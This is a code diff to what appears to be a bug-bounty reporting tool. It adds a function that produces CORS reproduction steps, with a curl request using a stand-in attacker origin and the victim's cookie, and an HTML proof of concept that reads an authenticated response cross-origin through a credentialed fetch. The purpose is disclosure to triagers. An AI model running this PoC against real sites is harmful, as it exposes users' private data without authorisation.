@@ -473,6 +473,62 @@ def _deterministic_proof_status(finding: dict[str, Any]) -> str:
     return "missing"
 
 
+def _concrete_repro(finding: dict[str, Any], class_id: str) -> tuple[list[str], str]:
+    """Concrete, copy-pasteable reproduction for classes whose captured evidence lets us
+    write the *exact* request and a runnable demonstration. Returns ``(steps, poc)`` — an
+    empty ``steps`` means "no concrete template; fall back to the generic checklist".
+
+    CORS is the driver: a HackerOne triager rejects a CORS report that only shows a
+    reflected header. They want (a) the precise cross-origin request that carries the
+    victim's credentials, (b) the ``Access-Control-Allow-Origin`` / ``-Allow-Credentials``
+    response headers shown as distinct headers, and (c) a PoC page that actually reads the
+    authenticated response cross-origin. We have all three in ``proof_evidence`` here."""
+    pe = finding.get("proof_evidence") if isinstance(finding.get("proof_evidence"), dict) else {}
+    url = str(finding.get("location") or "").strip()
+    if class_id != "cors" or not url.startswith(("http://", "https://")):
+        return [], ""
+    # The exact Origin GreyIQ sent (and the target reflected). Fall back to a clear
+    # attacker placeholder if a passive finding carried no captured request header.
+    req_hdr = str(pe.get("request_header") or "")
+    origin = req_hdr.split(":", 1)[1].strip() if req_hdr.lower().startswith("origin:") else "https://attacker.example"
+    # The ACAO/ACAC the target returned, shown as DISTINCT headers (not one combined line).
+    matched = str(pe.get("matched_value") or "")
+    hdr_parts = [h.strip() for h in matched.split(";") if h.strip()]
+    acao = next((h for h in hdr_parts if h.lower().startswith("access-control-allow-origin")),
+                f"Access-Control-Allow-Origin: {origin}")
+    acac = next((h for h in hdr_parts if "allow-credentials" in h.lower()),
+                "Access-Control-Allow-Credentials: true")
+    # Single-line steps (normalize_steps splits on newline, so keep each on one line).
+    curl = f"curl -i -H 'Origin: {origin}' -H 'Cookie: <YOUR authenticated session cookie>' '{url}'"
+    steps = [
+        "Log in to the target as a normal user and copy your session cookie / Authorization header from the browser devtools Network tab.",
+        f"From an origin you control (not the target), replay the request with an attacker Origin plus your credentials: `{curl}`",
+        f"Observe that the response reflects the attacker Origin and permits credentials — the misconfiguration: `{acao}` together with `{acac}`.",
+        "Because credentials are allowed for a reflected/untrusted Origin, a page on the attacker origin can read the authenticated response. Save the Proof of concept below as an .html file, host it on an origin you control, and open it in a browser that is logged in to the target.",
+        "The PoC performs a credentialed `fetch(..., {credentials:'include'})` and prints the victim's authenticated response body — that readable cross-origin data is the demonstrated impact.",
+    ]
+    poc = (
+        "<!doctype html>\n"
+        "<meta charset=\"utf-8\">\n"
+        "<title>CORS PoC — cross-origin read with victim credentials</title>\n"
+        f"<h3>CORS PoC: reading {url} cross-origin with the victim's credentials</h3>\n"
+        "<p>Open this page (hosted on an attacker-controlled origin) in a browser logged in to the target.</p>\n"
+        "<pre id=\"out\">running…</pre>\n"
+        "<script>\n"
+        f"fetch({json.dumps(url)}, {{ credentials: \"include\" }})\n"
+        "  .then(function (r) { return r.text(); })\n"
+        "  .then(function (body) {\n"
+        "    document.getElementById(\"out\").textContent =\n"
+        "      \"VULNERABLE — read \" + body.length + \" bytes of the victim's authenticated response cross-origin:\\n\\n\" + body;\n"
+        "  })\n"
+        "  .catch(function (e) {\n"
+        "    document.getElementById(\"out\").textContent = \"Not vulnerable / blocked by the browser: \" + e;\n"
+        "  });\n"
+        "</script>\n"
+    )
+    return steps, poc
+
+
 def _deterministic_attack_plan(finding: dict[str, Any], class_id: str) -> dict[str, Any]:
     """Build the offline attack plan: reproduction steps PLUS a real impact
     narrative, a structured proof-of-impact block whose *proof obligation* names the
@@ -480,6 +536,10 @@ def _deterministic_attack_plan(finding: dict[str, Any], class_id: str) -> dict[s
     a fully offline report is strong. The brain enriches these when configured."""
     where = finding.get("location") or finding.get("file_path") or "the affected location"
     meta = VULN_CLASSES.get(class_id)
+    # Class-specific concrete reproduction (a real crafted request + runnable PoC) wins
+    # when the captured evidence supports it; otherwise fall back to the generic
+    # benign-curl lead-in plus the class checklist below.
+    concrete_steps, concrete_poc = _concrete_repro(finding, class_id)
     steps = [f"Locate the issue at `{where}` (rule `{finding.get('rule_id', '')}`)."]
     # For a web finding, lead with a benign curl that reproduces the observed
     # condition. shlex.quote so an attacker-influenced path/query in the URL can't
@@ -495,6 +555,8 @@ def _deterministic_attack_plan(finding: dict[str, Any], class_id: str) -> dict[s
         steps.extend(meta["checklist"])
     else:
         steps.append("Confirm the finding is reachable from untrusted input, then assess impact.")
+    if concrete_steps:
+        steps = concrete_steps
 
     model = impact_model.impact_for_class(class_id)
     impact_text = (
@@ -521,7 +583,7 @@ def _deterministic_attack_plan(finding: dict[str, Any], class_id: str) -> dict[s
         # Deterministic remediation floor — a per-rule remediation still wins in the
         # report via `finding.get('remediation') or plan.get('remediation')`.
         "remediation": impact_model.remediation_for_class(class_id),
-        "poc": "",
+        "poc": concrete_poc,
     }
 
 
